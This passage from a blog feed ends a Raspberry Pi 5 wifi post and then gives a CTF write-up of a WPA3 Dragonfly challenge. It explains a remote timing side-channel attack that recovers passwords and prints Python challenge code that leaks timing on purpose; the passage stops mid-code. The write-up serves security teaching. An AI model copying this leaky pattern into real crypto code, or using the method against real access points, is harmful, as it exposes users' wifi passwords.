<p><img decoding="async" loading="lazy" alt="PI5 Pod" src="https://www.supernetworks.org/pages/assets/images/pi5podpic-ddab06ff59314c134ae8cc429742a66a.jpg" width="1510" height="1118" class="img_ev3q"></p>
<p>Together with the MT7916 cards this makes the Pi5 into a highly capable dual-band access point, with one of the bands potentially being 6ghz. With an additional USB dongle it is possible to run the Pi5 as a tri-band router.  We've been able to fully saturate all three bands. It's only when a 160Mhz channel is used (with speeds over 1 Gpbs) that we start to see I/O tuning matter for maintaining full bandwidth across USB3 and the mPCIE wifi card simultaneously.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="speed-tests-show-off-pi5-io">Speed Tests Show Off Pi5 I/O<a href="https://www.supernetworks.org/pages/blog/pi5-hardware-2024#speed-tests-show-off-pi5-io" class="hash-link" aria-label="Direct link to Speed Tests Show Off Pi5 I/O" title="Direct link to Speed Tests Show Off Pi5 I/O">​</a></h2>
<p>On the Pi5s we're actually seeing the best speeds we've ever seen with the MT7916 cards.</p>
<p><img decoding="async" loading="lazy" alt="Speed" src="https://www.supernetworks.org/pages/assets/images/combospeed-e28f69fb89e269cd1fe4940903cb8592.png" width="1012" height="1078" class="img_ev3q"></p>
<p>Not bad for a package that fits in the palm of your hand.</p>
<p>The image on the left represents a bandwidth test using the built-in ethernet for uplink.
The image on the right represents a bandwidth test with only wifi as the built-in ethernet tops out at 1Gbps.</p>
<p>Using an AX210 card on an intel laptop instead of the iPhone 15, to connect to the Pi5, we've seen 160 MHz connection throughput momentarily top out at 1.9Gbps  over TCP, from close range.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="next-steps">Next Steps<a href="https://www.supernetworks.org/pages/blog/pi5-hardware-2024#next-steps" class="hash-link" aria-label="Direct link to Next Steps" title="Direct link to Next Steps">​</a></h2>
<p>The HAT enables Raspberry Pi 5s to achieve impressive wifi throughput and full coverage for wifi bands. While we scale up production, we're also finishing up wifi enclosures. We have an <a href="https://docs.google.com/forms/d/1rO-MQ1rLbe3qI4wav2FWSNIbFzKI3Md3hMPRY4YPTr8/edit?usp=forms_home&amp;ths=true" target="_blank" rel="noopener noreferrer">interest form</a> if you'd like to stay posted on updates. You can also <a href="https://www.supernetworks.org/hat.html" target="_blank" rel="noopener noreferrer">preorder a HAT today</a></p>]]></content>
        <author>
            <name>Alex Radocea</name>
            <uri>https://twitter.com/defendtheworld</uri>
        </author>
        <category label="pi5" term="pi5"/>
        <category label="raspberry" term="raspberry"/>
        <category label="hardware" term="hardware"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Dragonfly Pake]]></title>
        <id>https://www.supernetworks.org/pages/blog/midnightsun-qualifiers-2024-dragonfly</id>
        <link href="https://www.supernetworks.org/pages/blog/midnightsun-qualifiers-2024-dragonfly"/>
        <updated>2024-04-22T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Midnight Sun Qualifiers 2024]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="midnight-sun-qualifiers-2024">Midnight Sun Qualifiers 2024<a href="https://www.supernetworks.org/pages/blog/midnightsun-qualifiers-2024-dragonfly#midnight-sun-qualifiers-2024" class="hash-link" aria-label="Direct link to Midnight Sun Qualifiers 2024" title="Direct link to Midnight Sun Qualifiers 2024">​</a></h2>
<p>Over the weekend a ctf team I help with, <a href="https://hackingforsoju.team/" target="_blank" rel="noopener noreferrer">HackingForSoju</a>, hosted the Midnight Sun CTF Qualifiers.
The finals will take place in <a href="https://conf.midnightsunctf.com/" target="_blank" rel="noopener noreferrer">Stockholm, Sweden on June 14-16</a>.</p>
<p>I put together a <a href="https://gist.github.com/lts-rad/a557f5eb2d4456bbe209d524bdfbfd23" target="_blank" rel="noopener noreferrer">challenge</a> around WPA3's Password Authenticated Key Exchange: <a href="https://datatracker.ietf.org/doc/html/rfc7664" target="_blank" rel="noopener noreferrer">Dragonfly</a></p>
<p>WPA3 has quite a few notes during our our wifi training where we discuss the background to the protocol, because it was so very worrisome from the start.</p>
<p><img decoding="async" loading="lazy" alt="trouble" src="https://www.supernetworks.org/pages/assets/images/wpa3trouble-d0ed718a7ac2fb3aa54ae6b7f8c6253c.png" width="1572" height="1606" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="a-troubled-pake">A Troubled PAKE<a href="https://www.supernetworks.org/pages/blog/midnightsun-qualifiers-2024-dragonfly#a-troubled-pake" class="hash-link" aria-label="Direct link to A Troubled PAKE" title="Direct link to A Troubled PAKE">​</a></h2>
<p>In 2013, when Dan Harkins first proposed Dragonfly many people pointed out that it was
inferior to existing PAKEs. Arguably it did not steer clear of existing patents, its performance was quite bad,
and very objectively it suffered terribly from sidechannels. It does not take great skill to spot them.</p>
<p>There's an IETF thread thread sums it up <a href="https://mailarchive.ietf.org/arch/msg/tls/A_SfHI4BsdAi4miklBs3TvUbu-Y/" target="_blank" rel="noopener noreferrer">here</a>.
Trevor Perrin, who is behind the Double Ratchet in Signal designed with Moxie Marlinspike, sums up what cryptographers saw.</p>
<p>In response, Dan Harkins goes on the offensive with personal attacks, saying several things of this nature:</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&gt; It makes little sense to use a 1024-bit FFC group in any circumstances</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&gt; because (pardon me, Kevin) - fuck the NSA.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  That certainly is a fashionable pose to strike these days!</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  But I brought up binding a 1024-bit FFC to a password because that's</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">what an RFC with your name on it does. So it makes sense to replace</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">"the NSA" in your sentence with "Trevor Perrin".</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-- Dan Harkins</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>When the designer of a security algorithm finds it acceptable to behave this way,
and the decision makers rubber stamp their actions, we should probably take a step back
as a society and ask if irrational people should be the ones solving and creating the
math problems that our security relies on.</p>
<p>So when the WiFi consortium used Dragonfly for WPA3 in 2018, many people were actually surprised,
since they assumed Dragonfly would never make its way into widespread usage.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="dragonblood">Dragonblood<a href="https://www.supernetworks.org/pages/blog/midnightsun-qualifiers-2024-dragonfly#dragonblood" class="hash-link" aria-label="Direct link to Dragonblood" title="Direct link to Dragonblood">​</a></h2>
<p>As WPA3 entered the ecosystem, security experts started looking. In 2019 the world's leading wifi security expert,
Mathy Vanhoef, with Eyal Ronen, demolished Dragonfly <a href="https://wpa3.mathyvanhoef.com/" target="_blank" rel="noopener noreferrer">https://wpa3.mathyvanhoef.com</a>.
Many of the attacks were the same as initially outlined by Trevor Perrin as well as many other cryptographers in 2013.</p>
<p>The team also invented some novel mechanisms to attack Brainpool curves in particular. They proved that the
hardening attempts with computing random values would provide statistical anomalies detectable by calculating timing variance.</p>
<p>What's even worse, under EAP-PWD (dragonfly with enterprise wifi), they found that implementaitons also accepted invalid curves, bypassing the password altogether.</p>
<p>Hardening was added to eliminate the remaining sidechannels.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-ctf-challenge">The CTF Challenge<a href="https://www.supernetworks.org/pages/blog/midnightsun-qualifiers-2024-dragonfly#the-ctf-challenge" class="hash-link" aria-label="Direct link to The CTF Challenge" title="Direct link to The CTF Challenge">​</a></h2>
<p>The qualifier's challenge celebrates these timing failures.  Players had to remotely exploit a python implementation of Dragonfly
that had the initial hardening only (always running 40 rounds).</p>
<p>The key insight is that the KDF for dragonfly is malleable based on the client's MAC address. Providing different MAC addresses
creates unique timing signatures for a given AP MAC address and Password Shared Key.</p>
<p>The timing signature can then be compared offline against a password list to find the real password.
With a vulnerable implementation this timing sidechannel is actually a lot more effective to exploit
than cracking WPA2 keys which are protected with PBKDF2.</p>
<p>The easiest timing differences to exploit are that lines [2] and [3] only happen sometimes.</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">initiate</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> other_mac</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> k</span><span class="token operator">=</span><span class="token number">40</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">"""</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">    See algorithm in https://tools.ietf.org/html/rfc7664</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">    in section 3.2.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">    """</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">other_mac </span><span class="token operator">=</span><span class="token plain"> other_mac</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    found </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    num_valid_points </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    counter </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    n </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">p</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">bit_length</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)"># Find x</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">while</span><span class="token plain"> counter </span><span class="token operator">&lt;=</span><span class="token plain"> k</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        base </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">compute_hashed_password</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">counter</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        temp </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">key_derivation_function</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">n</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> base</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b'Dragonfly Hunting And Pecking'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> temp </span><span class="token operator">&gt;=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">p</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            counter </span><span class="token operator">=</span><span class="token plain"> counter </span><span class="token operator">+</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">continue</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        seed </span><span class="token operator">=</span><span class="token plain"> temp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        val </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">curve</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">secure_curve_equation</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">seed</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">curve</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">secure_is_quadratic_residue</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">val</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> num_valid_points </span><span class="token operator">&lt;</span><span class="token plain"> </span><span class="token number">5</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                x </span><span class="token operator">=</span><span class="token plain"> seed</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                save </span><span class="token operator">=</span><span class="token plain"> base</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                found </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                num_valid_points </span><span class="token operator">+=</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">debug</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'Got point after {} iterations'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token builtin" style="color:rgb(189, 147, 249)">format</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">counter</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        counter </span><span class="token operator">=</span><span class="token plain"> counter </span><span class="token operator">+</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> found </span><span class="token operator">==</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">error</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'No valid point found after {} iterations'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token builtin" style="color:rgb(189, 147, 249)">format</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">k</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> </span><span class="token boolean">False</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">elif</span><span class="token plain"> found </span><span class="token operator">==</span><span class="token plain"> </span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token comment" style="color:rgb(98, 114, 164)"># https://crypto.stackexchange.com/questions/6777/how-to-calculate-y-value-from-yy-mod-prime-efficiently</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token comment" style="color:rgb(98, 114, 164)"># https://rosettacode.org/wiki/Tonelli-Shanks_algorithm</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        y </span><span class="token operator">=</span><span class="token plain"> tonelli_shanks</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">curve</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">curve_equation</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">x</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">p</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        PE </span><span class="token operator">=</span><span class="token plain"> Point</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">x</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> y</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token comment" style="color:rgb(98, 114, 164)"># check valid point</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">assert</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">curve</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">curve_equation</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">x</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">==</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">pow</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">y</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">p</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">PE </span><span class="token operator">=</span><span class="token plain"> PE</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">assert</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">curve</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">valid</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">PE</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> </span><span class="token boolean">True</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>To expand the timing window, so that players from around the world can exploit this remotely over TCP,
many more multiplications were added through a "masking" operation where random values are computed
alongside the real one at random, raising their cost to hundreds of milliseconds.</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">secure_curve_equation</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> x</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">"""</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">    Do not leak hamming weights to power analysis</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">    """</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    idx </span><span class="token operator">=</span><span class="token plain"> secrets</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">randbelow</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">dN</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    defense </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">defense_masks </span><span class="token operator">+</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    defense</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">idx</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> x</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> i </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">range</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">dN</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        tmp </span><span class="token operator">=</span><span class="token plain"> defense</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">idx</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        defense</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">i</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">curve_equation</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">defense</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">idx</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> defense</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">idx</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">secure_is_quadratic_residue</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> x</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">"""</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">    Do not leak hamming weights to power analysis</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">    """</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    idx </span><span class="token operator">=</span><span class="token plain"> secrets</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">randbelow</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token 